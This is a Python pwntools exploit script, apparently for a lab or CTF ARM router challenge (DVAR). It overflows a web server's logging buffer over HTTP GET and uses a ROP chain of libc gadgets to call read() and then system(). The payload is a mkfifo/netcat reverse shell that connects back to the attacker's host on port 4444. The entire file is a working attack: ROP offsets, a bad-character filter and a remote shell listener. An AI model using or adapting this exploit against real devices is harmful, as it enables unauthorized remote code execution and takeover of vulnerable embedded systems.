#! /usr/bin/python

from pwn import *
import socket
from ctypes import c_uint

context.arch='arm'
context.bits=32
context.terminal='sh'

HOST = "192.168.192.128"
PORT = 80
LHOST = socket.gethostbyname(socket.gethostname())
LPORT = 4444

# From disassembly, we can see that the log string is written
# to base $sp+4+216, and $lr is stored at $sp+4 (push {r11, lr}),
# so total overwrite needed is 220 (which includes 4 bytes for address), so 216 
BUFFER_OFFSET = 216

# https://security.stackexchange.com/questions/53345/can-pipe-shell-nc-pipe-achieve-remote-shell
# Tip to replace spaces with tabs from https://no-sec.net/writeup-dvar-rop-challenge/
SHELL_CMD1 = 'rm -f /tmp/f;mkfifo /tmp/f'
SHELL_CMD1 = SHELL_CMD1.replace(' ', '\t') + ';#'
SHELL_CMD2 = 'cat /tmp/f|/bin/sh -i 2>&1|nc %s %i >/tmp/f' % (LHOST,LPORT)
SHELL_CMD2 = SHELL_CMD2.replace(' ', '\t') + ';#'

# GET request requires / to be parsed correctly
# Format of the string that overwrites lr from binary
# This string will get written followed by our crafted GET request
log_str = "Connection from {}, request = \"GET /"
LOG_STR_LEN = len(log_str.format(LHOST))

GET_REQUEST = "GET /{} HTTP/1.0\n\n"

LIBC_BASE = 0x40000000
SYSTEM_ADDR = 0x00010d88
READ_ADDR = 0x00064cd4

def has_bad_chars( payload ):
    bar = bytearray(payload)
    for c in [ '\x00', '\x0a', '\x0d', '\x20', '\x3f' ]:
        if c in bar: 
            message = 'Payload contains bad character \'{}\' at offset {}'
            raise SystemExit(message.format(hex(ord(c)), bar.find(c)))
    return payload

def build_payload( SHELL_CMD ):
    '''
    Payload will execute a read call to grab extra data
    out of the socket to bypass shellcode length limitations.
    Rather than manually do a system call, just use a read gadget:
    r0: file descriptor (seems to always be 4)
    r1: void * buf (use mov r0, sp gadget to get stack pointer)
    r2: size 
    '''
    payload = ''
    payload += 'Z'*(BUFFER_OFFSET-LOG_STR_LEN)
    # Payload entry point
    payload += p32(LIBC_BASE + 0x00059ae7) # pop {r0, r4, pc};
    payload += 'A'*16 # Log() epilogue adds 16 to sp
    payload += p32(LIBC_BASE + 0x00059857) # pop {r0, r2, pc};
    payload += p32(LIBC_BASE + 0x0002410f) # masked addr for mov r0, sp
    payload += p32(0xfffffff0) # mask for r2 for mov r0, sp
    payload += p32(LIBC_BASE + 0x00039c94) # and r0, r0, r2; and r1, r1, r3; pop {r4, r5, r6, r7, pc};
    payload += 'AAAA' # Junk for r4
    payload += 'BBBB' # Junk for r5
    payload += p32(LIBC_BASE + 0x000580c2) # movs r1, r0; pop {r5, r6, pc}; to move sp to r1 for read call 	
    payload += 'DDDD' # Junk for r7
    payload += p32(LIBC_BASE + 0x000435ac) # bx r0; Executes mov r0, sp; blx r6;
    payload += 'EEEE' # Junk for r5	
    payload += 'FFFF' # Junk for r6
    # sp now in r1
    payload += p32(0xfffff39e) # We will add 0x1c40+0x20 to this to roll over to 4k read size
    payload += p32(LIBC_BASE + 0x0002379c) # add r4, r4, #0x1c40; add r0, r4, #0x20; pop {r4, r5, r6, pc};
    payload += 'GGGG' # Junk for r4
    payload += 'HHHH' # Junk for r5
    payload += 'IIII' # Junk for r6
    # size stored in r0
    payload += p32(LIBC_BASE + 0x00059a86) # pop {r2, pc};
    payload += p32(LIBC_BASE + 0x000580cc) # pop {r2, r3, r4, r5, pc}; for bx r2
    payload += p32(LIBC_BASE + 0x00061a7e) # push {r0, r3, r5, r6}; bx r2;
    # size now in r2
    payload += p32(LIBC_BASE + 0x0005a446) # pop {r3, pc};
    payload += p32(LIBC_BASE + 0x00031ed4) # mov r0, #4; pop {r4, pc}; for blx r3
    payload += p32(LIBC_BASE + 0x000455b0) # mov r2, r5; mov r0, r4; blx r3;
    payload += 'JJJJ' # Junk for r4
    payload += p32(LIBC_BASE + READ_ADDR) # call read(4, *sp, 4k)
    # Move *sp back to r0 so we can jump to it, there's no usable bx sp gadget
    payload += p32(LIBC_BASE + 0x0003fec0) # mov r0, r1; pop {r4, r5, r6, pc}; 
    payload += 'KKKK' # Junk for r4
    payload += 'LLLL' # Junk for r4
    payload += 'MMMM' # Junk for r4
    payload += p32(LIBC_BASE + 0x000435ac) # bx r0;
    payload += cyclic(37) # 37 bytes worth of sp decrement to fill

    # Rest of this is the system() rop chain from previous challenge
    payload += p32(LIBC_BASE + 0x00059ae7) # pop {r0, r4, pc}; 
    payload += p32(0x0fff0fff) # Add to overflow 
    # Address has bad character so add constant to computed address to overflow once in register
    payload += p32(0xf000f000 + SYSTEM_ADDR + 1)  
    payload += p32(LIBC_BASE + 0x0004b448) # add r0, r0, r4; pop {r4, pc};
    payload += 'AAAA' # Junk for r4
    payload += p32(LIBC_BASE + 0x000390ff) # movs r3, r0; pop {r4, r6, r7, pc};
    payload += 'BBBB' # Junk for r4
    payload += 'CCCC' # Junk for r6
    payload += 'DDDD' # Junk for r7
    payload += p32(LIBC_BASE + 0x00059857) # pop {r0, r2, pc};
    payload += p32(LIBC_BASE + 0x0002410f) # masked addr for mov r0, sp
    payload += p32(0xfffffff0) # mask for r2 for mov r0, sp
    payload += p32(LIBC_BASE + 0x00039c94) # and r0, r0, r2; and r1, r1, r3; pop {r4, r5, r6, r7, pc};
    payload += 'EEEE' # Junk for r4
    payload += p32(LIBC_BASE + 0x0005a447) # pop {r3, pc}; into r5 cleanup r6 off stack
    payload += 'FFFF' # Junk for r6
    payload += 'GGGG' # Junk for r7
    payload += p32(LIBC_BASE + 0x00059a87) # pop {r2, pc};
    payload += p32(LIBC_BASE + 0x00017b75) # pop {r0, r6, pc}; 
    payload += p32(LIBC_BASE + 0x00061a7f) # push {r0, r3, r5, r6}; bx r2; r6 cleanup by by earlier instruction in r5 
    payload += p32(LIBC_BASE + 0x000435ad) # bx r0; to branch to unmasked address
    payload += SHELL_CMD   
    return payload

def main():
    # Build and send first payload
    payload = build_payload(SHELL_CMD1 + '\t' + SHELL_CMD2)
    print len(payload)
    has_bad_chars( payload )

    sock = remote(HOST, PORT)
    sock.send(GET_REQUEST.format(payload))
    sock.close()

    # Build and send second payload to get shell
    payload = build_payload(SHELL_CMD2)
    has_bad_chars( payload )

    PWN_LISTENER = 0
    if PWN_LISTENER:
        l = listen(LPORT)

    sock = remote(HOST, PORT)
    sock.send(GET_REQUEST.format(payload))

    if PWN_LISTENER:
        shell = l.wait_for_connection()
        shell.interactive()
        shell.close()
    else:
        sock.interactive()
    if PWN_LISTENER:
        l.close()
    sock.close()

if __name__ == '__main__':
    main()
